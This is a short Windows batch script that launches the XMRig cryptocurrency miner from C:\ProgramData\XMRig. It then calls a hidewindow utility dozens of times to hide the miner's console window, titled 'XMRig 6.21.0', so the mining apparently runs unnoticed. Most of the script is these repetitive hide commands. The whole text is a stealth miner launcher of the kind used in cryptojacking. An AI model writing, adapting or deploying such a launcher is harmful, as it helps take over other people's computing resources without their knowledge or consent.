Title Start
hidewindow.exe Start
hidewindow.exe Start
Title Start
hidewindow.exe Start
hidewindow.exe Start
timeout 1
hidewindow.exe Start
hidewindow.exe Start
cd C:\ProgramData\XMRig\
cd C:\ProgramData\XMRig\
cd C:\ProgramData\XMRig\
Start xmrig.exe
hidewindow.exe Start
hidewindow.exe "XMRig 6.21.0"
hidewindow.exe Start
hidewindow.exe "XMRig 6.21.0"
hidewindow.exe Start
hidewindow.exe "XMRig 6.21.0"
hidewindow.exe Start
hidewindow.exe "XMRig 6.21.0"
hidewindow.exe Start
hidewindow.exe "XMRig 6.21.0"
hidewindow.exe Start
hidewindow.exe "XMRig 6.21.0"
hidewindow.exe Start
hidewindow.exe "XMRig 6.21.0"
hidewindow.exe Start
hidewindow.exe "XMRig 6.21.0"
hidewindow.exe Start
hidewindow.exe "XMRig 6.21.0"
hidewindow.exe Start
hidewindow.exe "XMRig 6.21.0"
hidewindow.exe Start
hidewindow.exe "XMRig 6.21.0"
hidewindow.exe Start
hidewindow.exe "XMRig 6.21.0"
hidewindow.exe Start
hidewindow.exe "XMRig 6.21.0"
hidewindow.exe Start
hidewindow.exe "XMRig 6.21.0"
hidewindow.exe Start
hidewindow.exe "XMRig 6.21.0"
hidewindow.exe Start
hidewindow.exe "XMRig 6.21.0"
hidewindow.exe Start
hidewindow.exe "XMRig 6.21.0"
hidewindow.exe Start
hidewindow.exe "XMRig 6.21.0"
hidewindow.exe Start
hidewindow.exe "XMRig 6.21.0"
hidewindow.exe Start
hidewindow.exe "XMRig 6.21.0"
hidewindow.exe Start
hidewindow.exe "XMRig 6.21.0"
hidewindow.exe Start
hidewindow.exe "XMRig 6.21.0"
hidewindow.exe Start
hidewindow.exe "XMRig 6.21.0"
hidewindow.exe Start
hidewindow.exe "XMRig 6.21.0"
hidewindow.exe Start
hidewindow.exe "XMRig 6.21.0"
hidewindow.exe Start
hidewindow.exe "XMRig 6.21.0"
hidewindow.exe Start
hidewindow.exe "XMRig 6.21.0"
hidewindow.exe Start
hidewindow.exe "XMRig 6.21.0"
hidewindow.exe Start
hidewindow.exe "XMRig 6.21.0"
hidewindow.exe Start
hidewindow.exe "XMRig 6.21.0"
hidewindow.exe Start
hidewindow.exe "XMRig 6.21.0"
hidewindow.exe Start
hidewindow.exe "XMRig 6.21.0"
hidewindow.exe Start
hidewindow.exe "XMRig 6.21.0"
hidewindow.exe Start
hidewindow.exe "XMRig 6.21.0"
hidewindow.exe Start
hidewindow.exe "XMRig 6.21.0"
hidewindow.exe Start
hidewindow.exe "XMRig 6.21.0"
Timeout 1
hidewindow.exe Start
hidewindow.exe "XMRig 6.21.0"
hidewindow.exe Start
hidewindow.exe "XMRig 6.21.0"
hidewindow.exe Start
hidewindow.exe "XMRig 6.21.0"
exit
